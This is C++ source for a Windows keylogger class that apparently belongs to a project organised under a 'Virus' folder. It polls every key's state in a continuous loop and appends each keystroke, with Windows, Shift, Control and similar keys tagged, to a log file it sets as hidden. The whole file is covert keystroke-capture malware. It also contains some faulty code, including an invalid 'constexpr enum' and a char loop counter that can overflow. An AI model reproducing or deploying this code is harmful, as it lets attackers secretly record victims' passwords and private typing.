#pragma once

#include "KeyLogger.hpp"
#include <windows.h>
#include <fstream>
#include <filesystem>
#include "../../../vs/Virus/PublicFunctions.hpp"

namespace fs = std::filesystem;

constexpr enum STATUS_CODES
{
	Success,
	ErrorInvalid
};

KeyLogger::KeyLogger()
{
	SetDefaultDirectory();
}

KeyLogger::KeyLogger(KeyLogger& keyLogger)
{
	SetDirectory(keyLogger.directory.c_str());
	CreateLogFile();
}

KeyLogger::KeyLogger(const char* directory)
{
	SetDirectory(directory);
}

int KeyLogger::SetDirectory(const char* directory) {
	struct stat st;
	if (stat(directory, &st) == 0) {
		this->directory = directory + FILE_NAME;
		if (CreateLogFile() == 0) {
			return STATUS_CODES(Success);
		}
	}
	SetDefaultDirectory();
	return STATUS_CODES(ErrorInvalid);
}

int KeyLogger::CreateLogFile() {
	std::ofstream log(directory);
	if (!log.good()) {
		log.close();
		return STATUS_CODES(ErrorInvalid);
	}
	log.close();
	std::wstring fileLPCWSTR = PublicFunctions::StringToWString(directory);
	int attributes = GetFileAttributes(fileLPCWSTR.c_str());
	if (SetFileAttributes(fileLPCWSTR.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN) != 0)
	{
		return STATUS_CODES(Success);
	}
	return STATUS_CODES(ErrorInvalid);
}

void KeyLogger::SetDefaultDirectory()
{
	std::string currentPath = fs::current_path().string();
	directory = currentPath + FILE_NAME;
	CreateLogFile();
}

void KeyLogger::StartKeyLogger() {
	std::fstream log;
	loggerState = TRUE;
	char c;
	while (loggerState) {
		for (c = 0; c <= 254 && loggerState; c++) {
			if (GetAsyncKeyState(c) & 0x1) {
				log.open(directory, std::ios::app);
				if (log)
				{
					switch (c)
					{
					case VK_LWIN:
						log << "{leftWindows}";
						break;
					case VK_RWIN:
						log << "{RightWindows}";
						break;
					case VK_BACK:
						log << "{backspace}";
						break;
					case VK_SHIFT:
						log << "{shift}";
						break;
					case VK_CONTROL:
						log << "{control}";
						break;
					case VK_CAPITAL:
						log << "{capslk}";
						break;
					case VK_TAB:
						log << "{tab}";
						break;
					default:
						if (GetKeyState(VK_CAPITAL)) {
							log << c;
						}
						else {
							log << (char)tolower(c);
						}
						break;
					}
				}
				log.close();
			}
		}
	}
}

void KeyLogger::StopLogging()
{
	loggerState = FALSE;
}
